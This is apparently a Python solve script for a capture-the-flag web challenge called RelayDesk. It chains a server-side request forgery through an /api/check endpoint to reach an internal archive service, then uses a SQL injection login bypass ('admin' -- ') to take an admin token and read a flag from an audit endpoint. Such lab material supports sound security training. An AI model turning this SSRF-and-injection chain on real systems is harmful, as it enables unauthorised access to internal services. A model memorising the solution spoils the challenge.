#!/usr/bin/env python3
import json
import re
import sys
import requests

def solve(base_url):
    session = requests.Session()
    print(f"[*] Targeting RelayDesk instance at: {base_url}")

    # Step 1: Reconnaissance
    print("[*] Step 1: Gathering network topology clues from status and help endpoints...")
    status_resp = session.get(f"{base_url}/status", timeout=5)
    if "archive-api" not in status_resp.text:
        print("[-] Warning: 'archive-api' not found on status page.")

    help_resp = session.get(f"{base_url}/help/networking", timeout=5)
    if "svc.local" not in help_resp.text or "8081" not in help_resp.text:
        print("[-] Warning: Private DNS or port clue missing in networking guide.")

    internal_host = "http://archive-api.svc.local:8081"
    print(f"[+] Deduced internal archive target: {internal_host}")

    # Step 2: Validate SSRF connectivity
    print("[*] Step 2: Validating SSRF connection to internal root index...")
    check_url = f"{base_url}/api/check"
    ssrf_payload = {
        "url": f"{internal_host}/",
        "method": "GET",
        "headers": {"Accept": "application/json"},
        "body": ""
    }
    r = session.post(check_url, json=ssrf_payload, timeout=8)
    res_data = r.json()
    if res_data.get("status") != 200:
        print(f"[-] Failed to reach internal index: {res_data}")
        sys.exit(1)
    print(f"[+] Internal root index response: {res_data.get('body').strip()}")

    # Step 3: Enumerate API documentation via SSRF
    print("[*] Step 3: Retrieving internal API documentation from /docs...")
    ssrf_payload["url"] = f"{internal_host}/docs"
    r = session.post(check_url, json=ssrf_payload, timeout=8)
    docs_data = r.json()
    print(f"[+] Internal docs retrieved. Endpoints discovered: /staff/session, /staff/audit")

    # Step 4: Perform SQL Injection bypass on /staff/session via SSRF
    print("[*] Step 4: Exploiting SQL injection on /staff/session to establish admin session...")
    sqli_body = json.dumps({
        "username": "admin' -- ",
        "password": "any_password"
    })
    ssrf_login = {
        "url": f"{internal_host}/staff/session",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "body": sqli_body
    }
    r = session.post(check_url, json=ssrf_login, timeout=8)
    login_result = r.json()
    if login_result.get("status") != 200:
        print(f"[-] SQL injection bypass failed: {login_result}")
        sys.exit(1)

    login_body = json.loads(login_result.get("body", "{}"))
    token = login_body.get("access_token")
    if not token:
        print(f"[-] No access token in response: {login_result}")
        sys.exit(1)
    print(f"[+] Admin session token obtained: {token}")

    # Step 5: Access /staff/audit using Bearer token via SSRF
    print("[*] Step 5: Fetching audit logs containing flag via SSRF...")
    ssrf_audit = {
        "url": f"{internal_host}/staff/audit",
        "method": "GET",
        "headers": {
            "Authorization": f"Bearer {token}"
        },
        "body": ""
    }
    r = session.post(check_url, json=ssrf_audit, timeout=8)
    audit_res = r.json()
    if audit_res.get("status") != 200:
        print(f"[-] Audit query failed: {audit_res}")
        sys.exit(1)

    audit_body = json.loads(audit_res.get("body", "{}"))
    flag = audit_body.get("note", "")
    print("\n" + "=" * 50)
    print(f"[+] FLAG RECOVERED: {flag}")
    print("=" * 50)

    match = re.search(r"TecFest26\{[^}]+\}", flag)
    if match:
        print("[+] Flag format verified successfully!")
        return True
    else:
        print("[-] Flag format check failed.")
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8082"
    solve(target.rstrip("/"))
